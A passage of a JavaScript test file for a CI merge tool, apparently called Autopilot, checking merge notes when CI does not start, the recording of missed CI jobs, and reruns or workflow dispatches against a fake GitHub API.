  const covered = sort([file('ci.yml', `${ON_PR}jobs:\n  tests:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n  codeql:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: github/codeql-action/analyze@v3\n`)]).jobs;
  const lintPlan = localJobPlan({ jobs: covered, head: HEAD, checkout: '/w/co', temp: '/w/tmp', machine: LINUX });
  const passed = localJobsRecord({ head: HEAD, plan: lintPlan, runs: { 'ci.yml#lint': { exit: { code: 0 }, log: '' } } });
  assert.deepEqual(ciMergeNote({ jobs: covered, record: passed, notStarted: { reason: 'queued', since: Date.UTC(2026, 10, 11, 20, 20) } }), [
    '- CI: did not start (queued since 20:20 UTC); covered by the local full suite: tests', '- CI job lint: local pass', '- CI job codeql: not run yet (CI did not start)']);
  // A local job with the full suite inside is covered and local; a missing result is "not run yet".
  assert.deepEqual(ciMergeNote({ jobs: lintOnly, record: localJobsRecord({ head: HEAD, plan, runs: {} }), notStarted: { reason: 'billing', message: 'The job was not started because your account is locked due to a billing issue.' } }), [
    '- CI: did not start (GitHub said "The job was not started because your account is locked due to a billing issue."); covered by the local full suite: tests',
    '- CI job tests: not run yet (CI did not start; the local run did not finish)', '- CI job codeql: not run yet (CI did not start)']);
  assert.equal(record.jobs[0].state, 'pass');
  assert.deepEqual(ciMergeNote({ jobs: [], notStarted: null }), ['- CI: did not start (reason unknown)']);
});

test('missed CI: the record holds the CI-only jobs and the local jobs that could not run, never a passed one', t => {
  const state = temp(t);
  const plan = localJobPlan({ jobs: lintOnly, head: HEAD, checkout: '/w/co', temp: '/w/tmp', machine: LINUX });
  const missed = missedCiJobs({ jobs: lintOnly, record: localJobsRecord({ head: HEAD, plan, runs: { 'ci.yml#tests': { exit: { code: 127 }, log: 'bash: line 1: npm: command not found\n' } } }) });
  assert.deepEqual(missed, [{ workflow: 'ci.yml', job: 'tests', checks: ['tests'], dispatch: false }, { workflow: 'ci.yml', job: 'codeql', checks: ['codeql'], dispatch: false }]);
  assert.deepEqual(missedCiJobs({ jobs: lintOnly, record: localJobsRecord({ head: HEAD, plan, runs: { 'ci.yml#tests': { exit: { code: 0 } } } }) }).map(job => job.job), ['codeql']);
  assert.equal(recordMissedCi({ root: state, merge: MERGE, pr: 4, issue: 3, missed: [] }), null);
  assert.ok(!existsSync(join(state, 'ci-missed.jsonl')));
  writeFileSync(join(state, 'ci-missed.jsonl'), '{"cut":');
  recordMissedCi({ root: state, merge: MERGE, pr: 4, issue: 3, missed }, { now: () => 10 });
  assert.deepEqual(readMissedCi({ root: state }), [{ merge: MERGE, pr: 4, issue: 3, at: 10, jobs: missed.map(job => ({ ...job, state: 'missed' })) }]);
  assert.throws(() => recordMissedCi({ root: state, merge: 'main', missed }), /merge must be 40 hex digits/);
});

// A fake GitHub for the missed-CI check: check runs per commit, workflow runs per commit, and the POSTs it got.
function fakeGitHub() {
  const g = { checks: new Map(), runs: new Map(), posts: [], reads: 0, status: new Map() };
  g.call = async (method, endpoint, body) => {
    if (method === 'POST') { g.posts.push({ endpoint, body }); return { status: g.status.get(endpoint) ?? 201, value: {} }; }
    g.reads++;
    let m;
    if ((m = /^repos\/o\/r\/commits\/(\w+)\/check-runs/.exec(endpoint))) return { status: 200, value: { check_runs: g.checks.get(m[1]) ?? [] } };
    if ((m = /^repos\/o\/r\/actions\/runs\?head_sha=(\w+)/.exec(endpoint))) return { status: 200, value: { workflow_runs: g.runs.get(m[1]) ?? [] } };
    return { status: 404 };
  };
  return g;
}
const missedCodeql = [{ workflow: 'codeql.yml', job: 'analyze', checks: ['Analyze (javascript)'], dispatch: true }];

test('missed CI on main: no call while CI is down; then one rerun, a pass drops the record', async t => {
  const state = temp(t), gh = fakeGitHub();
  let now = 1000;
  const ports = { gh, now: () => now, billing: async run => /spending limit/.test(run.output?.title ?? '') ? 'the spending limit' : null };
  recordMissedCi({ root: state, merge: MERGE, pr: 9, issue: 8, missed: missedCodeql }, ports);
  const down = await checkMissedCi({ root: state, repo: 'o/r', base: 'main', tip: TIP, ciDown: { since: 1, reason: 'queued' } }, ports);
  assert.equal(gh.reads, 0);
  assert.deepEqual([down.state, down.lines], ['waiting', [`missed CI: CI job Analyze (javascript) for PR #9 (${MERGE.slice(0, 7)}) waits to run on main`]]);
  // CI works again. The merge commit's run failed on the spending limit: rerun it once.
  gh.checks.set(MERGE, [{ id: 5, name: 'Analyze (javascript)', status: 'completed', conclusion: 'failure', output: { title: 'The job was not started because of the spending limit' } }]);
  gh.runs.set(MERGE, [{ id: 77, path: '.github/workflows/codeql.yml', status: 'completed', conclusion: 'failure' }]);
  const asked = await checkMissedCi({ root: state, repo: 'o/r', base: 'main', tip: TIP }, ports);
  assert.deepEqual(gh.posts, [{ endpoint: 'repos/o/r/actions/runs/77/rerun', body: undefined }]);
  assert.equal(asked.state, 'waiting');
  now += 60_000;
  await checkMissedCi({ root: state, repo: 'o/r', base: 'main', tip: TIP }, ports);
  assert.equal(gh.posts.length, 1, 'one rerun only');
  gh.checks.set(MERGE, [...gh.checks.get(MERGE), { id: 6, name: 'Analyze (javascript)', status: 'completed', conclusion: 'success' }]);
  const passed = await checkMissedCi({ root: state, repo: 'o/r', base: 'main', tip: TIP }, ports);
  assert.deepEqual([passed.state, passed.red, passed.lines], ['clear', [], []]);
  assert.deepEqual(readMissedCi({ root: state }), []);
});

test('missed CI on main: a failure is "main is red" for the caller and holds until the check passes at the base tip', async t => {
  const state = temp(t), gh = fakeGitHub(), ports = { gh, now: () => 5000 };
  recordMissedCi({ root: state, merge: MERGE, pr: 9, issue: 8, missed: missedCodeql }, ports);
  gh.checks.set(MERGE, [{ id: 5, name: 'Analyze (javascript)', status: 'completed', conclusion: 'failure', output: { title: 'Found 2 alerts' } }]);
  const red = await checkMissedCi({ root: state, repo: 'o/r', base: 'main', tip: TIP }, ports);
  assert.equal(red.state, 'red');
  assert.deepEqual(red.red, [{ merge: MERGE, pr: 9, issue: 8, workflow: 'codeql.yml', names: ['Analyze (javascript)'], sha: MERGE }]);
  assert.equal(gh.posts.length, 0, 'a real failure is not rerun');
  assert.equal(missedCiHeldLine(red.red[0], 'main', 41), 'merges held: CI job Analyze (javascript) failed on main after a merge without CI (issue #41)');
  // Still red at the base tip: the hold stays.
  gh.checks.set(TIP, [{ id: 9, name: 'Analyze (javascript)', status: 'completed', conclusion: 'failure' }]);
  assert.equal((await checkMissedCi({ root: state, repo: 'o/r', base: 'main', tip: TIP }, ports)).state, 'red');
  const fixed = 'd'.repeat(40);
  gh.checks.set(fixed, [{ id: 12, name: 'Analyze (javascript)', status: 'completed', conclusion: 'success' }]);
  assert.equal((await checkMissedCi({ root: state, repo: 'o/r', base: 'main', tip: fixed }, ports)).state, 'clear');
});

test('missed CI on main: no run to rerun starts the workflow on the base once; no way to start it is a stuck line', async t => {
  const state = temp(t), gh = fakeGitHub();
  let now = 0;
  const ports = { gh, now: () => now };
  recordMissedCi({ root: state, merge: MERGE, pr: 9, issue: 8, missed: [...missedCodeql, { workflow: 'mac.yml', job: 'mac', checks: ['test (macos-latest)'], dispatch: false }] }, ports);
  const first = await checkMissedCi({ root: state, repo: 'o/r', base: 'main', tip: TIP }, ports);
  assert.deepEqual(gh.posts, [{ endpoint: 'repos/o/r/actions/workflows/codeql.yml/dispatches', body: { ref: 'main' } }]);
  assert.deepEqual(first.stuck.map(row => row.workflow), ['mac.yml']);
  assert.ok(first.lines.includes(`missed CI: CI job test (macos-latest) for PR #9 (${MERGE.slice(0, 7)}) did not run on main, and Autopilot cannot start it: run the workflow mac.yml by hand`));
  // The dispatched run is due at the tip; 6 hours with no run of that name make it stuck too, with no second ask.
  now += 6 * 60 * 60 * 1000;
  const later = await checkMissedCi({ root: state, repo: 'o/r', base: 'main', tip: TIP }, ports);
  assert.equal(gh.posts.length, 1);
  assert.deepEqual(later.stuck.map(row => row.workflow), ['codeql.yml', 'mac.yml']);
  // A person runs the workflows by hand (the stuck line asks for it): a failure at the base tip is red there, a pass
  // at the base tip clears the job. A later commit of the base holds the merged change.
  gh.checks.set(TIP, [{ id: 20, name: 'Analyze (javascript)', status: 'completed', conclusion: 'success' }, { id: 21, name: 'test (macos-latest)', status: 'completed', conclusion: 'failure' }]);
  const byHand = await checkMissedCi({ root: state, repo: 'o/r', base: 'main', tip: TIP }, ports);
  assert.deepEqual([byHand.state, byHand.red.map(row => [row.workflow, row.names, row.sha]), byHand.stuck], ['red', [['mac.yml', ['test (macos-latest)'], TIP]], []]);
  assert.equal(gh.posts.length, 1);
  // A refused ask is stuck at once; a queued run waits with no ask; a GitHub read error throws and keeps the file.
  const other = temp(t), gh2 = fakeGitHub();
  gh2.status.set('repos/o/r/actions/runs/3/rerun', 403);
  gh2.runs.set(MERGE, [{ id: 3, path: '.github/workflows/codeql.yml', status: 'completed' }]);
  recordMissedCi({ root: other, merge: MERGE, pr: 1, issue: 2, missed: missedCodeql }, { now: () => 0 });
  assert.equal((await checkMissedCi({ root: other, repo: 'o/r', base: 'main', tip: TIP }, { gh: gh2, now: () => 0 })).stuck.length, 1);
  const third = temp(t), gh3 = fakeGitHub();
  gh3.runs.set(MERGE, [{ id: 4, path: '.github/workflows/codeql.yml', status: 'queued' }]);
  recordMissedCi({ root: third, merge: MERGE, pr: 1, issue: 2, missed: missedCodeql }, { now: () => 0 });
  assert.equal((await checkMissedCi({ root: third, repo: 'o/r', base: 'main', tip: TIP }, { gh: gh3, now: () => 0 })).state, 'waiting');
  assert.equal(gh3.posts.length, 0);
  await assert.rejects(checkMissedCi({ root: third, repo: 'o/r', base: 'main', tip: TIP }, { gh: { call: async () => ({ status: 502 }) }, now: () => 0 }), error => error.code === 'github');
  assert.equal(readMissedCi({ root: third }).length, 1);
});
